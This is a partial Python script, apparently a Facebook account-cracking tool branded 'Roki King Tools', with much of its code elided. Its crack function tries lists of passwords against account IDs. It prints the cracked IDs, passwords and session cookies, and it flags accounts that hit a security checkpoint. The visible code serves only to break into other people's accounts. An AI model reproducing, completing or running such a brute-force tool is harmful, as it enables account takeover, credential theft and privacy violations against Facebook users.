...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRoki')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Roki' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  Roki,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/Roki.King.Ok.Bro')
def banner():
	os.system("clear")
	logo =("""''\33[m
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Roki-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Roki-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢Roki-Cp] {idf} â€¢ {pw}')     
				...
				#Roki-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}â€¢Roki-OkðŸ’š] {idf} â€¢ {pw}\n\033[0;93m[ðŸŒº]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " Roki,  Ok,  id"')
